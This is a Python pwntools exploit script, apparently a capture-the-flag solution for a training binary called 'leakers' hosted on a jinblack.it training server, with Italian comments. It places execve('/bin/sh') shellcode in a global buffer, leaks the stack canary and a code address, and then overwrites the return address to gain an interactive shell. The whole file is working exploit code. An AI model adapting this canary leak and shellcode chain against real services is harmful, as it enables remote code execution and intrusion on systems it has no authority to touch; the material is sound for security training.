from pwn import *

CODE = '''
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
mov rsi, rdx
mov rdx, rdx
mov rax, 0x3b
syscall
nop
'''

'''
N.B.
funziona solo sul server remoto 

per farlo funzionare in locale bisogna avere un buffer di173 per lekare il canary (mette merda tra la fine del buffer r l'rbp.
Inoltre bisogna eliminare la prima r.recv() 
'''

ELF('./leakers')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2012)
else:
    r = process('./leakers')
    gdb.attach(r, '''
        #b *0x004011bb
    ''')

shellcode_1 = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x89\xD6\x48\x89\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\x90"
shellcode_1 = asm(CODE,arch="amd64", bits='64')
nop_sled = b"\x90"

input('press a key..')

#Shellcode on global buffer
r.sendline(shellcode_1)

#Canary leak && .text addrress leak
r.sendline(nop_sled*104)
r.recv()
leak  = r.recv()
leak = bytearray(leak[-40:])

base_address = leak[-6:]
base_address = bytearray(base_address)
base_address.reverse()
base_address = int(base_address.hex(), 16)
where_to_jump = base_address +  2098624
where_to_jump = where_to_jump.to_bytes(8, 'little')

canary = leak[-13:]
canary = canary[:7]
canary =  b"\x00" + canary
c = bytearray(canary)
c.reverse()

#Assemble exploit
exploit = nop_sled*104+canary+nop_sled*8+where_to_jump
r.sendline(exploit)

r.interactive()
    

